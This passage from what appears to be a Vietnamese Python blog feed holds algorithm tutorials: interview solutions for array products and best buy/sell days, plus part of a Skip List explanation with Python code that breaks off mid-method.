  &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
    &lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;left_product&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;right_product&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;B&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Khi đọc kỹ đoạn mã trên, ta sẽ thấy rằng có lẽ danh sách &lt;strong&gt;left_product&lt;/strong&gt; là thừa. Thay vào đó, trong quá trình tính &lt;strong&gt;B&lt;/strong&gt;, ta có thể giữ một biến tạm cho biết tích từ &lt;strong&gt;A[0]&lt;/strong&gt; đến &lt;strong&gt;A[i - 1]&lt;/strong&gt;. Phần này xin được dành làm một thử thách nhỏ cho bạn đọc. Nếu bạn giải ra, xin hãy cùng trao đổi trong &lt;a class="reference external" href="forum.vithon.org"&gt;diễn đàn&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</content><category term="interview"></category></entry><entry><title>Phỏng vấn: Cách mua và bán lời nhất</title><link href="/2015/03/phong-van-cach-mua-va-ban-loi-nhat.html" rel="alternate"></link><published>2015-03-06T04:47:00+07:00</published><updated>2015-03-06T04:47:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2015-03-06:/2015/03/phong-van-cach-mua-va-ban-loi-nhat.html</id><summary type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Giả sử như bạn có thông tin về giá của một món hàng trong một khoảng thời gian nào đó. Tìm ngày bạn sẽ mua, và ngày bạn sẽ bán món hàng đó để đạt được lợi nhuận cao nhất.&lt;/p&gt;
&lt;p&gt;Đầu vào: một danh sách các giá trị …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Giả sử như bạn có thông tin về giá của một món hàng trong một khoảng thời gian nào đó. Tìm ngày bạn sẽ mua, và ngày bạn sẽ bán món hàng đó để đạt được lợi nhuận cao nhất.&lt;/p&gt;
&lt;p&gt;Đầu vào: một danh sách các giá trị thực là giá của món hàng từng ngày.&lt;/p&gt;
&lt;p&gt;Đầu ra: hai chỉ mục trong danh sách là ngày mua, và ngày bán.&lt;/p&gt;
&lt;p&gt;Ví dụ: với dữ liệu vào &lt;strong&gt;[10, 13, 9, 10, 11]&lt;/strong&gt;, thì kết quả là &lt;strong&gt;(0, 1)&lt;/strong&gt; ý là mua ngày 0 với mức giá 10, bán ra ngày 1 với mức giá 13, lợi nhuận cao nhất là 3 đơn vị.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Gọi danh sách đầu vào là &lt;strong&gt;A&lt;/strong&gt;. Câu hỏi này yêu cầu chúng ta tìm hai chỉ mục &lt;strong&gt;x&lt;/strong&gt; và &lt;strong&gt;y&lt;/strong&gt; trong &lt;strong&gt;A&lt;/strong&gt; sao cho &lt;strong&gt;A[y] - A[x]&lt;/strong&gt; lớn nhất, với điều kiện &lt;strong&gt;x &amp;lt; y&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Đặt &lt;strong&gt;min_x&lt;/strong&gt; là chỉ mục của giá thấp nhất trong danh sách &lt;strong&gt;A&lt;/strong&gt;. Khi xét đến phần tử &lt;strong&gt;i&lt;/strong&gt; trong danh sách &lt;strong&gt;A&lt;/strong&gt;, ta sẽ gặp một số trường hợp sau:&lt;/p&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;Giá giảm &lt;strong&gt;A[i] &amp;lt; A[min_x]&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;Đây là cơ hội mua vào nên ta sẽ đặt &lt;strong&gt;min_x = i&lt;/strong&gt;.&lt;/dd&gt;
&lt;dt&gt;Giá tăng &lt;strong&gt;A[i] &amp;gt;= A[min_x]&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;Đây là cơ hội bán ra nên ta sẽ phải xét thêm &lt;strong&gt;A[i] - A[min_x] &amp;gt; A[y] - A[x]&lt;/strong&gt;, tức là bán vào lúc này có lời hơn lúc trước không. Nếu có, ta sẽ cập nhật &lt;strong&gt;y, x = i, min_x&lt;/strong&gt;.&lt;/dd&gt;
&lt;/dl&gt;
&lt;/div&gt;
&lt;div class="section" id="cai-dat"&gt;
&lt;h2&gt;Cài đặt&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;min_x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;min_x&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
      &lt;span class="n"&gt;min_x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;
    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;min_x&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
      &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;min_x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
</content><category term="interview"></category></entry><entry><title>Danh sách nhảy cóc (Skip List)</title><link href="/2014/05/danh-sach-nhay-coc-skip-list.html" rel="alternate"></link><published>2014-05-01T15:01:00+07:00</published><updated>2014-05-01T15:01:00+07:00</updated><author><name>Phan Đắc Anh Huy</name></author><id>tag:None,2014-05-01:/2014/05/danh-sach-nhay-coc-skip-list.html</id><summary type="html">&lt;div class="section" id="gioi-thieu"&gt;
&lt;h2&gt;Giới thiệu&lt;/h2&gt;
&lt;p&gt;Qua các lượt bài trước, chúng ta đã thảo luận về thuận toán tìm kiếm nhị
phân và ngăn (partition). Cả hai thuận toán này đều dựa trên cấu trúc dữ
liệu mảng (array) vốn rất quen thuộc với chúng ta.&lt;/p&gt;
&lt;p&gt;Ngoài ra, hai thuật toán trên được …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="gioi-thieu"&gt;
&lt;h2&gt;Giới thiệu&lt;/h2&gt;
&lt;p&gt;Qua các lượt bài trước, chúng ta đã thảo luận về thuận toán tìm kiếm nhị
phân và ngăn (partition). Cả hai thuận toán này đều dựa trên cấu trúc dữ
liệu mảng (array) vốn rất quen thuộc với chúng ta.&lt;/p&gt;
&lt;p&gt;Ngoài ra, hai thuật toán trên được xếp vào nhóm thuật toán
tất định (determistic algorithm). Các thuật toán thuộc nhóm này thỏa mãn
hai điều kiện:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Luôn trả về kết quả giống nhau nếu được cung cấp cùng một dữ liệu đầu vào.&lt;/li&gt;
&lt;li&gt;Các trạng thái (state) trong quá trình tính toán phải giống nhau với cùng một dữ liệu đầu vào.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Trong bài viết này tác giả đề cập đến cấu trúc dữ liệu &amp;quot;Danh Sách Nhảy
Cóc&amp;quot; (Skip List), cơ chế hoạt động của cấu trúc dữ liệu này (bao gồm các
thao tác Thêm, Xóa, Tìm Kiếm) phụ thuộc vào yếu tố ngẫu nhiên vì vậy nó
được xếp vào nhóm thuật toán ngẫu tính (randomized algorithm), trái
ngược với nhóm thuật toán tất định.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="muc-dich"&gt;
&lt;h2&gt;Mục đích&lt;/h2&gt;
&lt;p&gt;Một cấu trúc dữ liệu đơn giản nhưng hiệu quả trên các tác vụ cơ bản: Thêm, Xóa và Tìm Kiếm.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="dinh-nghia"&gt;
&lt;h2&gt;Định nghĩa&lt;/h2&gt;
&lt;p&gt;Danh sách nhảy cóc S là một tập hợp các danh sách &lt;tt class="docutils literal"&gt;S[0], S[1] ... &lt;span class="pre"&gt;S[N-1]&lt;/span&gt;&lt;/tt&gt;. Để dễ hình dung chúng ta xem mỗi danh sách con tương ứng với một &amp;quot;tầng&amp;quot;, trong đó &lt;tt class="docutils literal"&gt;0&lt;/tt&gt; là tầng thấp nhất, cho đến &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;N-1&lt;/span&gt;&lt;/tt&gt; là tầng cao nhất. Danh sách nhảy cóc luôn thỏa mãn các điều kiện:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Mỗi danh sách con chứa các giá trị theo thứ tự tăng dần.&lt;/li&gt;
&lt;li&gt;Phần từ đầu và cuối mỗi danh sách con đều là NULL.&lt;/li&gt;
&lt;li&gt;Danh sách ở tầng cao hơn là dãy con của danh sách tầng dưới.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ví dụ một trạng thái của danh sách nhảy cóc chứa dãy số &lt;tt class="docutils literal"&gt;12, 23, 34, 46, 64, 78, 89&lt;/tt&gt;:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
S[3]    NULL             23                                              NULL
S[2]    NULL             23                      64                      NULL
S[1]    NULL             23      34              64      78              NULL
S[0]    NULL     12      23      34      46      64      78      89      NULL
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="tim-kiem-trong-danh-sach"&gt;
&lt;h2&gt;Tìm kiếm trong danh sách&lt;/h2&gt;
&lt;p&gt;Gọi K là giá trị cần tìm kiếm. Ý tưởng chính của thuật toán là cố gắng duyệt càng xa càng tốt trên tầng cao hơn và tiếp tục ở tầng thấp hơn cho đến khi không thể duyệt được nữa.&lt;/p&gt;
&lt;p&gt;Thuật toán bắt đầu từ phần tử đầu tiên, tầng trên cùng của danh sách. Duyệt theo quy luật:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Nhảy sang phần tử kế tiếp trên cùng tầng nếu phần tử tiếp theo đó khác NULL và bé hơn hoặc bằng K.&lt;/li&gt;
&lt;li&gt;Nếu không thể di chuyển trên cùng tầng được nữa:&lt;ul&gt;
&lt;li&gt;Dừng duyệt nếu như đang ở tầng thấp nhất.&lt;/li&gt;
&lt;li&gt;Ngược lại, nhảy xuống phần tử ngay bên dưới ở tầng tiếp theo.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Sau khi kết thúc duyệt danh sách, nếu phần tử hiện tại bằng K, thuật toán kết luận tìm được K, ngược lại K không tồn tại trong danh sách.&lt;/p&gt;
&lt;p&gt;Ví dụ dưới đây minh họa việc tìm kiếm &lt;tt class="docutils literal"&gt;K = 85&lt;/tt&gt; trong danh sách S tại trạng thái được mô tả ở phần trước:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
S[3]    NULL -------&amp;gt; 23                                        NULL
S[2]    NULL          23  -----------&amp;gt;  64                      NULL
S[1]    NULL          23    34          64 -&amp;gt; 78 -&amp;gt; 83          NULL
S[0]    NULL    12    23    34    46    64    78    83    90    NULL
&lt;/pre&gt;
&lt;div class="section" id="giai-thich"&gt;
&lt;h3&gt;Giải thích&lt;/h3&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="4%" /&gt;
&lt;col width="13%" /&gt;
&lt;col width="16%" /&gt;
&lt;col width="15%" /&gt;
&lt;col width="51%" /&gt;
&lt;/colgroup&gt;
&lt;thead valign="bottom"&gt;
&lt;tr&gt;&lt;th class="head"&gt;Bước&lt;/th&gt;
&lt;th class="head"&gt;Tầng hiện tại&lt;/th&gt;
&lt;th class="head"&gt;Phần tử hiện tại&lt;/th&gt;
&lt;th class="head"&gt;Phần tử kế tiếp&lt;/th&gt;
&lt;th class="head"&gt;Di chuyển&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;S[3]&lt;/td&gt;
&lt;td&gt;NULL&lt;/td&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;td&gt;Nhảy sang phần tử kế tiếp vì 23 &amp;lt;= K&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;S[3]&lt;/td&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;td&gt;NULL&lt;/td&gt;
&lt;td&gt;Nhảy xuống tầng dưới vì phần tử kế tiếp bằng NULL&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;S[2]&lt;/td&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;td&gt;64&lt;/td&gt;
&lt;td&gt;Nhảy sang phần tử kế tiếp vì 64 &amp;lt;= K&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;S[2]&lt;/td&gt;
&lt;td&gt;64&lt;/td&gt;
&lt;td&gt;NULL&lt;/td&gt;
&lt;td&gt;Nhảy xuống tầng dưới vì phần tử kế tiếp bằng NULL&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;S[1]&lt;/td&gt;
&lt;td&gt;64&lt;/td&gt;
&lt;td&gt;78&lt;/td&gt;
&lt;td&gt;Nhảy sang phần tử kế tiếp vì 78 &amp;lt;= K&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;S[1]&lt;/td&gt;
&lt;td&gt;78&lt;/td&gt;
&lt;td&gt;83&lt;/td&gt;
&lt;td&gt;Nhảy sang phần tử kế tiếp vì 83 &amp;lt;= K&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;S[1]&lt;/td&gt;
&lt;td&gt;83&lt;/td&gt;
&lt;td&gt;NULL&lt;/td&gt;
&lt;td&gt;Nhảy xuống tầng dưới vì phần tử kế tiếp bằng NULL&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;S[0]&lt;/td&gt;
&lt;td&gt;83&lt;/td&gt;
&lt;td&gt;90&lt;/td&gt;
&lt;td&gt;Dừng thuật toán vì 90 &amp;gt; K&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Dựa vào giá trị của phần tử cuối cùng, chúng ta kết luận không tìm thấy
giá trị 85 trong danh sách. Mặt khác, nếu chúng ta tìm &lt;tt class="docutils literal"&gt;K = 83&lt;/tt&gt;, các
bước duyệt trên danh sách sẽ giống hệt như vậy ngoại trừ việc thuật toán
sẽ kết thúc ở bước thứ 7 và chúng ta tìm được K.&lt;/p&gt;
&lt;p&gt;Để ý các bước duyệt, chúng ta thấy thuật toán đã &lt;em&gt;nhảy cóc&lt;/em&gt; qua các phần
tử 12, 34 và 46.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="them-phan-tu-vao-danh-sach"&gt;
&lt;h2&gt;Thêm phần tử vào danh sách&lt;/h2&gt;
&lt;p&gt;Gọi H là giá trị của phần tử cần thêm vào danh sách S. Thuật toán được
mô tả như sau:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Thực hiện việc tìm kiếm H trong S và lưu lại các vị trí cuối cùng trên mỗi tầng trong khi duyệt: &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;p[N-1],&lt;/span&gt; &lt;span class="pre"&gt;p[N-2],&lt;/span&gt; &lt;span class="pre"&gt;...,&lt;/span&gt; p[1], p[0]&lt;/tt&gt; tương ứng với tầng &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;N-1,&lt;/span&gt; &lt;span class="pre"&gt;N-2,&lt;/span&gt; &lt;span class="pre"&gt;...,&lt;/span&gt; 1, 0&lt;/tt&gt;.&lt;/li&gt;
&lt;li&gt;Nếu H đã tồn tại trong danh sách S, kết thúc thuật toán.&lt;/li&gt;
&lt;li&gt;Thêm phần tử giá trị &lt;tt class="docutils literal"&gt;H&lt;/tt&gt; vào sau &lt;tt class="docutils literal"&gt;p[0]&lt;/tt&gt;.&lt;/li&gt;
&lt;li&gt;Tung một đồng xu&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Nếu được mặt ngửa, di chuyển lên tầng trên và thêm phần tử giá trị H vào sau vị trí tương ứng ở tầng này. (&lt;tt class="docutils literal"&gt;p[1]&lt;/tt&gt; nếu là tầng 1, &lt;tt class="docutils literal"&gt;p[2]&lt;/tt&gt; nếu là tầng 2, ...).&lt;/li&gt;
&lt;li&gt;Nếu được mặt xấp, dừng thuật toán.&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;Quay lại bước 4.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Lưu ý tại bước 4, thuật toán phải tạo tầng mới nếu đồng xu hiện mặt ngửa
và chúng ta đang ở tầng trên cùng.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="xoa-phan-tu-khoi-danh-sach"&gt;
&lt;h2&gt;Xóa phần tử khỏi danh sách&lt;/h2&gt;
&lt;p&gt;Gọi H là giá trị của phần tử cần phải xóa khỏi danh sách S. Thuật toán
khá tương tự với việc thêm phần tử:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Thực hiện việc tìm kiếm H trong S và lưu lại các vị trí cuối cùng trên mỗi tầng trong khi duyệt: &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;p[N-1],&lt;/span&gt; &lt;span class="pre"&gt;p[N-2],&lt;/span&gt; &lt;span class="pre"&gt;...,&lt;/span&gt; p[1], p[0]&lt;/tt&gt;.&lt;/li&gt;
&lt;li&gt;Nếu không tìm thấy H, thuật toán kết thúc.&lt;/li&gt;
&lt;li&gt;Ngược lại, xóa tất cả các phần tử tại vị trí &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;p[N-1],&lt;/span&gt; &lt;span class="pre"&gt;p[N-2],&lt;/span&gt; &lt;span class="pre"&gt;...,&lt;/span&gt; p[1], p[0]&lt;/tt&gt; khỏi danh sách.&lt;/li&gt;
&lt;li&gt;Xóa tất cả các tầng trống (tầng chỉ có hai phần tử NULL ở đầu và cuối).&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;div class="section" id="cai-dat"&gt;
&lt;h2&gt;Cài đặt&lt;/h2&gt;
&lt;p&gt;Chúng ta định nghĩa một phần tử của danh sách nhảy cóc như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SkipListNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Như các bạn thấy, với mỗi phần tử ngoài giá trị cần lưu, chúng ta chỉ quan tâm đến phần tử kế tiếp (bên phải) và phần tử tương ứng nằm ở tầng dưới.&lt;/p&gt;
&lt;p&gt;Kế tiếp, định nghĩa danh sách nhảy cóc với hàm khởi tạo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SkipList&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SkipListNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lớp &lt;tt class="docutils literal"&gt;SkipList&lt;/tt&gt; sử dụng biến &lt;tt class="docutils literal"&gt;head&lt;/tt&gt; để lưu phần tử đầu tiên của tầng cao nhất, đây luôn là vị trí bắt đầu khi chúng ta duyệt danh sách.&lt;/p&gt;
&lt;p&gt;Dễ thấy rằng tác vụ Thêm và Tìm Kiếm đều cần phải duyệt qua danh sách
với cùng một cách để tìm một giá trị, vì vậy chúng ta định nghĩa
hàm &lt;tt class="docutils literal"&gt;_search&lt;/tt&gt; để có thể dùng chung cho cả hai như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;last_nodes&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
        &lt;span class="n"&gt;current_node&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;

        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
